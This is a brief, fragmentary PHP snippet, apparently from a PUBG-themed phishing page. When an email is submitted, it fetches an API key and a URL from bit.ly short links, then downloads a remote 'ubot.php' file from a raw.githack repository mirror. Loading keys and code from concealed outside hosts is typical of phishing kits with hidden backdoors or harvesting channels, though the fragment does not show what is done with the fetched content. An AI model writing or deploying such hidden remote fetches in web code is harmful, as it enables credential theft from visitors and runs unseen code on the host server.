...
if($email){
$api_key = file_get_contents('https://bit.ly/31VtJkq');
...
$url1 = file_get_contents('https://bit.ly/35PLKSw');
...
<?
$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/P/ubot.php');
